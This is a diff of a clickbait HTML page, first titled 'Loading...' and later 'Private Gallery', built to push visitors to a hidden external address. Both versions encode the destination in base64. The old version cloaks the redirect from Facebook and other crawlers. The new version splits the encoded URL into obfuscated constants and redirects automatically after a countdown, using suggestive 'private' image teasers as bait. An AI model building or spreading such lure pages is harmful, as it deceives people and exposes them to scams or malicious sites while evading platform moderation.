@@ -2,150 +2,194 @@
 <html lang="en">
 <head>
 <meta charset="UTF-8">
-<title>Loading...</title>
+<title>Private Gallery</title>
 
-<!-- ========== OG PREVIEW (tetap kebaca crawler) ========== -->
-<meta property="og:title" content="🔴 Live Update Today">
-<meta property="og:description" content="Watch the latest update happening right now ▶️ Click to view.">
-<meta property="og:image" content="https://i.imgur.com/7fT7ulx.jpeg">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<!-- OG -->
+<meta property="og:title" content="✨ Live Session, Latest Gallery Update">
+<meta property="og:description" content="A small private collection preview">
+<meta property="og:image" content="https://imgur.com/7fT7ulx">
 <meta property="og:type" content="website">
 
 <style>
 body {
   margin:0;
+  font-family:Arial;
   background:#0f0f0f;
   color:white;
-  font-family:Arial;
+}
+
+#loading {
+  position:fixed;
+  width:100%;
+  height:100%;
+  background:#0f0f0f;
   display:flex;
   justify-content:center;
   align-items:center;
-  height:100vh;
   flex-direction:column;
+  z-index:999;
 }
 
-/* 🔥 LOADER LEBIH BESAR */
 .loader {
-  width:80px;
-  height:80px;
-  border:7px solid #333;
-  border-top:7px solid #00ffcc;
+  width:45px;
+  height:45px;
+  border:5px solid #333;
+  border-top:5px solid #00ffcc;
   border-radius:50%;
   animation:spin 1s linear infinite;
-  margin-bottom:30px;
 }
 
 @keyframes spin {
-  0%{transform:rotate(0)}
-  100%{transform:rotate(360deg)}
+  100% {transform:rotate(360deg);}
 }
 
-h2 {
-  font-size:26px;
-  margin-bottom:15px;
-}
-
-.progress-bar {
-  width:300px;
-  height:8px;
-  background:#222;
-  border-radius:10px;
-  overflow:hidden;
-}
-
-.progress {
-  height:100%;
-  width:0%;
-  background:#00ffcc;
-  transition:width .2s ease;
-}
-
-p {
-  font-size:14px;
-  opacity:.7;
-  margin-top:10px;
-}
-
-/* fallback button */
-.btn {
-  margin-top:20px;
-  padding:10px 18px;
-  background:#00ffcc;
-  color:#000;
-  border-radius:6px;
-  font-size:14px;
+#enterScreen {
   display:none;
+  height:100vh;
+  justify-content:center;
+  align-items:center;
+  flex-direction:column;
+  text-align:center;
+}
+
+button {
+  margin-top:20px;
+  padding:12px 20px;
+  background:#00ffcc;
+  border:none;
+  border-radius:8px;
+  font-weight:bold;
   cursor:pointer;
+}
+
+#galleryPage {
+  display:none;
+  text-align:center;
+}
+
+.gallery {
+  display:grid;
+  grid-template-columns:repeat(3,1fr);
+  gap:8px;
+  padding:10px;
+}
+
+.gallery img {
+  width:100%;
+  border-radius:8px;
+  cursor:pointer;
+  transition:0.2s;
+}
+
+.gallery img:hover {
+  transform:scale(1.05);
+}
+
+.note {
+  font-size:13px;
+  opacity:0.7;
+  margin-top:10px;
 }
 </style>
 </head>
 
 <body>
 
-<div class="loader"></div>
-
-<h2 id="status">Preparing your content...</h2>
-
-<div class="progress-bar">
-  <div class="progress" id="progress"></div>
+<div id="loading">
+  <div class="loader"></div>
+  <p style="opacity:0.6;">Loading content...</p>
 </div>
 
-<p>Please wait a moment</p>
+<div id="enterScreen">
+  <h2>Private Gallery</h2>
+  <p style="opacity:0.7;">Tap below or wait a moment…</p>
+  <button onclick="_0xA12_enter()">Enter</button>
+</div>
 
-<div class="btn" id="btn">Continue</div>
+<div id="galleryPage">
+
+  <h2>Private Collection</h2>
+
+  <p style="opacity:0.75; max-width:320px; margin:auto;">
+  A small collection that’s been getting attention lately.  
+  Some moments are a little more… personal than others.
+  </p>
+
+  <div class="gallery">
+    <img src="https://i.imgur.com/cT072eg.jpeg" onclick="_0xA12_go()">
+    <img src="https://i.imgur.com/wVCBBj2.jpeg" onclick="_0xA12_go()">
+    <img src="https://i.imgur.com/j6qaYFd.jpeg" onclick="_0xA12_go()">
+    <img src="https://i.imgur.com/xX61mRI.jpeg" onclick="_0xA12_go()">
+    <img src="https://i.imgur.com/knjOdH3.jpeg" onclick="_0xA12_go()">
+    <img src="https://i.imgur.com/LRypO0v.jpeg" onclick="_0xA12_go()">
+    <img src="https://i.imgur.com/TBRyf55.jpeg" onclick="_0xA12_go()">
+    <img src="https://i.imgur.com/5OlrEm2.jpeg" onclick="_0xA12_go()">
+    <img src="https://i.imgur.com/0poFxSi.jpeg" onclick="_0xA12_go()">
+    <img src="https://i.imgur.com/AOM9fTf.jpeg" onclick="_0xA12_go()">
+    <img src="https://i.imgur.com/d9gZSs3.jpeg" onclick="_0xA12_go()">
+    <img src="https://i.imgur.com/AxmBfxf.jpeg" onclick="_0xA12_go()">
+  </div>
+
+  <p style="opacity:0.6; font-size:13px;">
+  Not everything is shown here. Full access available below.
+  </p>
+
+  <button onclick="_0xA12_go()">Open Full Gallery</button>
+
+  <p class="note">
+    You will be redirected in <span id="count">5</span>s...
+  </p>
+
+</div>
 
 <script>
-let progress = 0;
-let bar = document.getElementById("progress");
-let text = document.getElementById("status");
-let btn = document.getElementById("btn");
 
-// 🔒 encoded URL
-let encoded = "aHR0cHM6Ly9mZGVkZGcuaHVic3Mub25lL3AvbmhWTnk=";
+// loading → enter
+setTimeout(() => {
+  document.getElementById("loading").style.display = "none";
+  document.getElementById("enterScreen").style.display = "flex";
 
-// 🚫 ANTI CRAWLER (FB, bot, dll)
-let ua = navigator.userAgent.toLowerCase();
-let isBot = /facebookexternalhit|facebot|crawler|spider|bot/i.test(ua);
+  setTimeout(() => {
+    _0xA12_enter();
+  }, 2000); // dipercepat
 
-// kalau bot → jangan redirect
-function go(){
-  if(!isBot){
-    window.location.href = atob(encoded);
-  }
+}, 1200);
+
+// enter
+function _0xA12_enter() {
+  document.getElementById("enterScreen").style.display = "none";
+  document.getElementById("galleryPage").style.display = "block";
+  _0xStartCountdown();
 }
 
-// ⏱️ loading ±6 detik
-let start = Date.now();
+// obfuscated link
+const _0x1 = "aHR0cHM6Ly9mZGVk";
+const _0x2 = "ZGcuaHVic3Mub25l";
+const _0x3 = "L3AvbmhWTnk=";
 
-let interval = setInterval(() => {
-  let elapsed = Date.now() - start;
-  progress = (elapsed / 6000) * 100;
-  if(progress > 100) progress = 100;
+function _0xA12_go() {
+  const _0xdecoded = atob(_0x1 + _0x2 + _0x3);
+  window.location.href = _0xdecoded;
+}
 
-  bar.style.width = progress + "%";
+// countdown redirect
+function _0xStartCountdown() {
+  let time = 5;
+  const el = document.getElementById("count");
 
-  if (progress < 30) {
-    text.innerText = "Preparing your content...";
-  } else if (progress < 60) {
-    text.innerText = "Connecting to server...";
-  } else if (progress < 90) {
-    text.innerText = "Almost ready...";
-  } else {
-    text.innerText = "Launching...";
-  }
+  const timer = setInterval(() => {
+    time--;
+    el.textContent = time;
 
-  if (progress >= 100) {
-    clearInterval(interval);
+    if (time <= 0) {
+      clearInterval(timer);
+      _0xA12_go();
+    }
+  }, 1000);
+}
 
-    // tampilkan tombol kalau redirect gagal
-    btn.style.display = "block";
-
-    go();
-  }
-
-}, 100);
-
-// fallback klik manual
-btn.onclick = go;
 </script>
 
 </body>
